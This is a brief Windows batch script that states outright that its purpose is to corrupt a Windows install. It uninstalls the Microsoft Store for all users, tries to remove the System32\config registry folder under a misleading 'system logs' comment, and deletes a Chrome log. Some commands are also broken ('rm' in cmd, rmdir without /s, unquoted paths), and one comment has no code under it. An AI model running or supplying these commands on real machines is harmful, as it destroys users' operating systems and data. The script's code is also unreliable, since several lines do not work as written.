@echo off

:: Author: Matt Waldeck
:: Date: 2024.06.03
:: Update: 2024.06.03
:: Purpose: This script will corrupt a Windows install.

:: Remove Microsoft Store
powershell.exe Get-AppXPackage *Store* -AllUsers | Remove-AppxPackage

:: Delete a few core system files.

:: Delete all system logs.
rmdir C:\Windows\System32\config
if exist %LOCALAPPDATA%\Google\Chrome\User Data\chrome_debug.log (
    rm %LOCALAPPDATA%\Google\Chrome\User Data\chrome_debug.log
)